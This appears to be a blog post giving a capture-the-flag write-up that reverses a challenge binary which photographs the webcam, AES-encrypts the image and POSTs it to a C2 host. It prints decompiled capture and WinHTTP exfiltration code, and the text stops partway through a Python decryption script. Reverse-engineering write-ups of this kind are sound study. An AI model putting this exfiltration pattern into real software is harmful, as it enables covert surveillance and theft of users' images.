@@ -1,0 +1,288 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Liste - https://nothoudaifa.github.io/">
+    <title>Stealerusk chall from Alpacahack B-Side writeup | nothoudaifa</title>
+    <meta name="description" content="I talk about computer stuff.">
+    <meta property="og:url" content="https://nothoudaifa.github.io/posts/alpaca-bside-stealerusk/">
+	<meta property="og:site_name" content="nothoudaifa">
+	<meta property="og:title" content="Stealerusk chall from Alpacahack B-Side writeup">
+	<meta property="og:description" content="this was a B-Side challenge released on Alpacahack, you can check it out here, it’s difficulty is Very Hard 7.0 .
+TL;DR reversing a windows malware that takes an image from the webcam and sends it to a C2 server.
+Solve we are given two files chal.exe and packet.pcap, i started by checking the pcap, it only contains a single POST request with some binary data as you can see here:">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-06-28T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-06-28T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Rev">
+		<meta property="article:tag" content="Windows">
+
+    
+	<meta itemprop="name" content="Stealerusk chall from Alpacahack B-Side writeup">
+	<meta itemprop="description" content="this was a B-Side challenge released on Alpacahack, you can check it out here, it’s difficulty is Very Hard 7.0 .
+TL;DR reversing a windows malware that takes an image from the webcam and sends it to a C2 server.
+Solve we are given two files chal.exe and packet.pcap, i started by checking the pcap, it only contains a single POST request with some binary data as you can see here:">
+	<meta itemprop="datePublished" content="2026-06-28T00:00:00+00:00">
+	<meta itemprop="dateModified" content="2026-06-28T00:00:00+00:00">
+	<meta itemprop="wordCount" content="670">
+	<meta itemprop="keywords" content="Ctf,Rev,Windows">
+    
+    <link rel="canonical" href="https://nothoudaifa.github.io/posts/alpaca-bside-stealerusk/">
+    <link rel="icon" href="https://nothoudaifa.github.io//assets/favicon.ico">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link href="https://www.google-analytics.com" rel="preconnect" crossorigin>
+    <link rel="alternate" type="application/atom+xml" title="nothoudaifa" href="https://nothoudaifa.github.io//atom.xml" />
+    <link rel="alternate" type="application/json" title="nothoudaifa" href="https://nothoudaifa.github.io//feed.json" />
+    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bricolage+Grotesque">
+    
+    
+    <style>*,:after,:before{box-sizing:border-box;padding:0}body{font:1rem/1.5 bricolage grotesque,-apple-system,BlinkMacSystemFont,segoe ui,Helvetica,Arial,sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:2rem;background:#fffdfa;color:#000}.skip-link{position:absolute;top:-40px;left:0;background:#eee;z-index:100}.skip-link:focus{top:0}header{line-height:2;padding-bottom:1.5rem}.link{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-decoration:none}.time{font-variant-numeric:tabular-nums;white-space:nowrap}blockquote{border-left:5px solid #eee;padding-left:1rem;margin:0}a,a:visited{color:inherit}a:hover,a.heading-link{text-decoration:none}pre{padding:.5rem;overflow:auto;overflow-x:scroll;overflow-wrap:normal}code,pre{font-family:San Francisco Mono,Monaco,consolas,lucida console,dejavu sans mono,bitstream vera sans mono,monospace;font-size:normal;font-size:small;background:#eee}code{margin:.1rem;border:none;overflow:visible;overflow-wrap:anywhere}ul{list-style-type:square}ul,ol{padding-left:1.2rem}.list{line-height:2;list-style-type:none;padding-left:0}.list li{padding-bottom:.1rem}.meta{color:#777}.content{max-width:70ch;margin:0 auto}header{line-height:2;display:flex;justify-content:space-between;padding-bottom:1rem}header a{text-decoration:none}header ul{list-style-type:none;padding:0}header li,header a{display:inline}h2.post{padding-top:.5rem}header ul a:first-child{padding-left:1rem}.nav{height:1px;background:#000;content:'';max-width:10%}.list li{display:flex;align-items:baseline}.list li time{flex:initial}.hr-list{margin-top:0;margin-bottom:0;margin-right:.5rem;margin-left:.5rem;height:1px;border:0;border-bottom:1px dotted #ccc;flex:1 0 1rem}.m,hr{border:0;margin:3rem 0}img{max-width:100%;height:auto}.post-date{margin:5% 0}.index-date{color:#9a9a9a}.animate-blink{animation:opacity 1s infinite;opacity:1}@keyframes opacity{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}.tags{display:flex;justify-content:space-between}.tags ul{padding:0;margin:0}.tags li{display:inline}.avatar{height:120px;width:120px;position:relative;margin:-10px 0 0 15px;float:right;border-radius:50%}table{width:100%;border-collapse:collapse}th,td{border:1px solid #ddd;text-align:left;padding:8px}th{background-color:#f2f2f2} </style>
+  
+    
+  
+  
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "articleSection": "posts",
+      "name": "Stealerusk chall from Alpacahack B-Side writeup",
+      "headline": "Stealerusk chall from Alpacahack B-Side writeup",
+      "alternativeHeadline": "",
+      "description": "\u003cp\u003ethis was a B-Side challenge released on Alpacahack, you can check it out \u003ca href=\u0022https:\/\/alpacahack.com\/daily-bside\/challenges\/stealerusk?month=2026-03\u0022\u003ehere\u003c\/a\u003e, it\u0026rsquo;s difficulty is Very Hard 7.0 .\u003c\/p\u003e\n\u003ch2 id=\u0022tldr\u0022\u003eTL;DR\u003c\/h2\u003e\n\u003cp\u003ereversing a windows malware that takes an image from the webcam and sends it to a C2 server.\u003c\/p\u003e\n\u003ch2 id=\u0022solve\u0022\u003eSolve\u003c\/h2\u003e\n\u003cp\u003ewe are given two files \u003ccode\u003echal.exe\u003c\/code\u003e and \u003ccode\u003epacket.pcap\u003c\/code\u003e, i started by checking the pcap, it only contains a single POST request with some binary data as you can see here:\n\u003cimg\n  src=\u0022\/alpaca-bside-stealerusk\/2026-06-28%7c13:27:16.166.png\u0022\n  alt=\u0022wireshark screenshot\u0022\n  loading=\u0022lazy\u0022\n  decoding=\u0022async\u0022\n  class=\u0022full-width\u0022\n\/\u003e\n\n\u003c\/p\u003e",
+      "inLanguage": "en-us",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https:\/\/nothoudaifa.github.io\/posts\/alpaca-bside-stealerusk\/"
+      },
+      "author" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "creator" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "accountablePerson" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "copyrightHolder" : "nothoudaifa",
+      "copyrightYear" : "2026",
+      "dateCreated": "2026-06-28T00:00:00.00Z",
+      "datePublished": "2026-06-28T00:00:00.00Z",
+      "dateModified": "2026-06-28T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "nothoudaifa",
+          "url": "https://nothoudaifa.github.io/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "https:\/\/nothoudaifa.github.io\/assets\/favicon.ico",
+              "width":"32",
+              "height":"32"
+          }
+      },
+      "image": "https://nothoudaifa.github.io/assets/favicon.ico",
+      "url" : "https:\/\/nothoudaifa.github.io\/posts\/alpaca-bside-stealerusk\/",
+      "wordCount" : "670",
+      "genre" : [ "ctf" , "rev" , "windows" ],
+      "keywords" : [ "ctf" , "rev" , "windows" ]
+  }
+  </script>
+  
+  
+  </head>
+
+<body>
+  <a class="skip-link" href="#main">Skip to main</a>
+  <main id="main">
+  <div class="content">
+    <header>
+<p style="padding: 0;margin: 0;">
+  <a href="https://nothoudaifa.github.io/">
+    <b>nothoudaifa</b>
+    <span class="text-stone-500 animate-blink">▮</span>
+  </a>
+</p>
+<ul style="padding: 0;margin: 0;">
+  
+  
+  <li class="">
+    <a href="/posts/"><span>Posts</span></a>
+    
+  <li class="">
+    <a href="/about/"><span>About</span></a>
+    
+  </li>
+</ul>
+</header>
+<hr class="hr-list" style="padding: 0;margin: 0;">
+    <section>
+      <h2 class="post">Stealerusk chall from Alpacahack B-Side writeup</h2>
+      <p>this was a B-Side challenge released on Alpacahack, you can check it out <a href="https://alpacahack.com/daily-bside/challenges/stealerusk?month=2026-03">here</a>, it&rsquo;s difficulty is Very Hard 7.0 .</p>
+<h2 id="tldr">TL;DR</h2>
+<p>reversing a windows malware that takes an image from the webcam and sends it to a C2 server.</p>
+<h2 id="solve">Solve</h2>
+<p>we are given two files <code>chal.exe</code> and <code>packet.pcap</code>, i started by checking the pcap, it only contains a single POST request with some binary data as you can see here:
+<img
+  src="/alpaca-bside-stealerusk/2026-06-28%7c13:27:16.166.png"
+  alt="wireshark screenshot"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<p>now opening the executable in ida we get this decompilation of the main function:
+<img
+  src="/alpaca-bside-stealerusk/2026-06-28%7c13:29:35.298.png"
+  alt="ida main function screenshot"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<p>the first part gets the current directory path and compares it to another path using it&rsquo;s rfid (rfid is a folder identifier in windows, you can check <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath">docs</a> of the function to know more about it) if the comparision succeeds then it will execute the malware code.</p>
+<p>the malware calls 2 functions <code>sub_140001640</code> and <code>sub_1400017B0</code>.</p>
+<h4 id="sub_140001640">sub_140001640:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#00a8c8">__int64</span> <span style="color:#75af00">sub_140001640</span><span style="color:#111">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">HWND</span> <span style="color:#111">hWnd</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+40h] [rbp-28h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">int</span> <span style="color:#111">v2</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+48h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">hWnd</span> <span style="color:#f92672">=</span> <span style="color:#75af00">capCreateCaptureWindowW</span><span style="color:#111">(</span><span style="color:#d88200">L</span><span style="color:#d88200">&#34;capture&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">640</span><span style="color:#111">,</span> <span style="color:#ae81ff">480</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#f92672">!</span><span style="color:#111">hWnd</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">1</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">IsWindow</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">v2</span> <span style="color:#f92672">=</span> <span style="color:#75af00">SendMessageW</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x40Au</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">v2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#f92672">!</span><span style="color:#111">v2</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">1</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75af00">Sleep</span><span style="color:#111">(</span><span style="color:#ae81ff">0x3E8u</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75af00">SendMessageW</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x405u</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#111">LPARAM</span><span style="color:#111">)</span><span style="color:#111">handler</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">byte_140005114</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">SendMessageW</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x43Du</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">Sleep</span><span style="color:#111">(</span><span style="color:#ae81ff">0x1F4u</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">IsWindow</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75af00">SendMessageW</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x40Bu</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">else</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">IsWindow</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75af00">SendMessageW</span><span style="color:#111">(</span><span style="color:#111">hWnd</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x40Bu</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">1</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">}</span>
+</span></span></code></pre></div><p>i haven&rsquo;t fully reversed this function, but based on the documentation of <a href="https://learn.microsoft.com/en-us/windows/win32/api/vfw/nf-vfw-capcreatecapturewindoww">capCreateCaptureWindowW</a>, it creates a capture window which can be used to capture some data, it seems to configure it using SendMessageW one important thing is that it&rsquo;s setting some kind of handler function <code>handler</code>, we will get to that later.</p>
+<h4 id="sub_1400017b0">sub_1400017B0:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#00a8c8">__int64</span> <span style="color:#00a8c8">__fastcall</span> <span style="color:#75af00">sub_1400017B0</span><span style="color:#111">(</span><span style="color:#00a8c8">const</span> <span style="color:#00a8c8">void</span> <span style="color:#f92672">*</span><span style="color:#111">a1</span><span style="color:#111">,</span> <span style="color:#111">DWORD</span> <span style="color:#111">a2</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">void</span> <span style="color:#f92672">*</span><span style="color:#111">hRequest</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+40h] [rbp-38h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span> <span style="color:#111">v4</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+48h] [rbp-30h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">void</span> <span style="color:#f92672">*</span><span style="color:#111">hConnect</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+50h] [rbp-28h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">void</span> <span style="color:#f92672">*</span><span style="color:#111">hSession</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+58h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#111">DWORD</span> <span style="color:#111">dwNumberOfBytesWritten</span><span style="color:#111">;</span> <span style="color:#75715e">// [rsp+60h] [rbp-18h] BYREF
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">v4</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">hConnect</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">hRequest</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">hSession</span> <span style="color:#f92672">=</span> <span style="color:#75af00">WinHttpOpen</span><span style="color:#111">(</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#d88200">L</span><span style="color:#d88200">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36&#34;</span><span style="color:#111">,</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span><span style="color:#111">,</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span><span style="color:#111">,</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span><span style="color:#111">,</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hSession</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">hConnect</span> <span style="color:#f92672">=</span> <span style="color:#75af00">WinHttpConnect</span><span style="color:#111">(</span><span style="color:#111">hSession</span><span style="color:#111">,</span> <span style="color:#d88200">L</span><span style="color:#d88200">&#34;meccha-ayashii-server.internal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x50u</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hConnect</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#111">hRequest</span> <span style="color:#f92672">=</span> <span style="color:#75af00">WinHttpOpenRequest</span><span style="color:#111">(</span><span style="color:#111">hConnect</span><span style="color:#111">,</span> <span style="color:#d88200">L</span><span style="color:#d88200">&#34;POST&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">L</span><span style="color:#d88200">&#34;/waiwai&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hRequest</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">WinHttpSendRequest</span><span style="color:#111">(</span><span style="color:#111">hRequest</span><span style="color:#111">,</span> <span style="color:#d88200">L</span><span style="color:#d88200">&#34;Content-Type: application/octet-stream</span><span style="color:#8045ff">\r\n</span><span style="color:#d88200">&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0xFFFFFFFF</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#111">a2</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#111">dwNumberOfBytesWritten</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#75af00">WinHttpWriteData</span><span style="color:#111">(</span><span style="color:#111">hRequest</span><span style="color:#111">,</span> <span style="color:#111">a1</span><span style="color:#111">,</span> <span style="color:#111">a2</span><span style="color:#111">,</span> <span style="color:#f92672">&amp;</span><span style="color:#111">dwNumberOfBytesWritten</span><span style="color:#111">)</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">dwNumberOfBytesWritten</span> <span style="color:#f92672">==</span> <span style="color:#111">a2</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#111">v4</span> <span style="color:#f92672">=</span> <span style="color:#75af00">WinHttpReceiveResponse</span><span style="color:#111">(</span><span style="color:#111">hRequest</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hRequest</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">WinHttpCloseHandle</span><span style="color:#111">(</span><span style="color:#111">hRequest</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hConnect</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">WinHttpCloseHandle</span><span style="color:#111">(</span><span style="color:#111">hConnect</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">if</span> <span style="color:#111">(</span> <span style="color:#111">hSession</span> <span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">WinHttpCloseHandle</span><span style="color:#111">(</span><span style="color:#111">hSession</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">return</span> <span style="color:#111">v4</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">}</span>
+</span></span></code></pre></div><p>this function takes 2 global variables which are data buffer and size (which are used in the handler function too) and sends an http post request as we&rsquo;ve seen in the pcap.</p>
+<h4 id="handler-function">handler function:</h4>
+<p>following the code of the handler function we reach <code>sub_140001100</code> which is called like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75af00">sub_140001100</span><span style="color:#111">(</span><span style="color:#111">a1</span><span style="color:#111">,</span> <span style="color:#111">a2</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">unk_140005078</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">int</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">data_sent</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#00a8c8">__int64</span><span style="color:#111">)</span><span style="color:#f92672">&amp;</span><span style="color:#111">data_sent_size</span><span style="color:#111">);</span>
+</span></span></code></pre></div><p>you can check the function decompilation <a href="/alpaca-bside-stealerusk/sub_140001100_decomp.c">here</a></p>
+<p>i guessed that a1 and a2 are data pointer and data size from their signature <code>UCHAR *a1, ULONG a2</code>, this function generates a random 0x10 value and uses it as iv and uses the third argument as key then it encrypts the capture data using aes-cbc, and then it puts the result in data_sent with the iv as the first 16 bytes.</p>
+<h4 id="decryption">decryption:</h4>
+<p>knowing this i made the following decryption function in python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">Crypto.Cipher</span> <span style="color:#f92672">import</span> <span style="color:#111">AES</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">Crypto.Util.Padding</span> <span style="color:#f92672">import</span> <span style="color:#111">unpad</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">with</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#39;./enc&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;rb&#39;</span><span style="color:#111">)</span> <span style="color:#00a8c8">as</span> <span style="color:#111">f</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">data</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#f92672">.</span><span style="color:#111">read</span><span style="color:#111">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">iv</span> <span style="color:#f92672">=</span> <span style="color:#111">data</span><span style="color:#111">[:</span><span style="color:#ae81ff">0x10</span><span style="color:#111">]</span> <span style="color:#75715e"># iv is the first 0x10 bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">data</span> <span style="color:#f92672">=</span> <span style="color:#111">data</span><span style="color:#111">[</span><span style="color:#ae81ff">0x10</span><span style="color:#111">:]</span> <span style="color:#75715e"># rest is encrypted data</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">key</span> <span style="color:#f92672">=</span> <span style="color:#111">bytes</span><span style="color:#f92672">.</span><span style="color:#111">fromhex</span><span style="color:#111">(</span><span style="color:#d88200">&#39;9Dh, E7h, 5Ch, 29h, B5h, 07, 38h, 71h, 0Dh, 83h, 49h,39h, 73h, FDh, EBh, 9Ch&#39;</span><span style="color:#f92672">.</span><span style="color:#111">replace</span><span style="color:#111">(</span><span style="color:#d88200">&#39;,&#39;</span><span style="color:#111">,</span><span style="color:#d88200">&#39;&#39;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">replace</span><span style="color:#111">(</span><span style="color:#d88200">&#39;h&#39;</span><span style="color:#111">,</span><span style="color:#d88200">&#39;&#39;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">replace</span><span style="color:#111">(</span><span style="color:#d88200">&#39; &#39;</span><span style="color:#111">,</span><span style="color:#d88200">&#39;&#39;</span><span style="color:#111">))</span> <span style="color:#75715e"># the key extracted from ida</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#111">key</span><span style="color:#f92672">.</span><span style="color:#111">hex</span><span style="color:#111">())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">cipher</span> <span style="color:#f92672">=</span> <span style="color:#111">AES</span><span style="color:#f92672">.</span><span style="color:#111">new</span><span style="color:#111">(</span><span style="color:#111">key</span><span style="color:#111">,</span> <span style="color:#111">AES</span><span style="color:#f92672">.</span><span style="color:#111">MODE_CBC</span><span style="color:#111">,</span> <span style="color:#111">iv</span><span style="color:#111">)</span>
